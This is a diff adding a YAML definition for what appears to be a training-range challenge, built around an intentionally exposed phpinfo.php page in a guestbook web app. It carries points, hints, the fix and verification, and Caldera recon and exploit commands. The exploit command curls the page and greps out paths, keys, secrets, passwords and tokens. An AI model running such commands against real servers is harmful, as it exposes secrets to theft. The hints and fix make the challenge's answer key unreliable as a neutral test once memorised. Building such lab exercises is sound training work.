@@ -1,0 +1,32 @@
+id: guestbook_phpinfo
+name: Exposed phpinfo() Page
+description: A phpinfo.php file exists in the web root that calls phpinfo(), exposing the full PHP configuration, loaded extensions, environment variables, and server paths.
+type: vulnerability
+difficulty: easy
+points: 100
+category: web
+tags: [information-disclosure, php, misconfiguration]
+conflicts: []
+requires: [php_guestbook]
+script: guestbook_phpinfo.sh
+verification:
+  type: file_absent
+  path: /opt/guestbook/phpinfo.php
+suggested_fix: "Delete the phpinfo page: rm /opt/guestbook/phpinfo.php"
+hints:
+  - "Look for diagnostic or debug pages in the web application directory"
+  - "Check /opt/guestbook/ for PHP info or debug files"
+  - "Delete /opt/guestbook/phpinfo.php — this file should never exist in a production environment"
+caldera:
+  tactic: collection
+  technique:
+    attack_id: T1082
+    name: "System Information Discovery"
+  recon:
+    description: "Check if phpinfo.php is accessible"
+    command: |
+      curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/phpinfo.php | grep -q "200" && echo "VULNERABLE: phpinfo.php is accessible" || echo "SECURE: phpinfo.php not found"
+  exploit:
+    description: "Extract PHP configuration and environment variables from phpinfo()"
+    command: |
+      curl -s http://localhost:8080/phpinfo.php | grep -oP '(?<=<tr><td class="e">)[^<]+' | grep -iE "path|key|secret|pass|token" | head -20
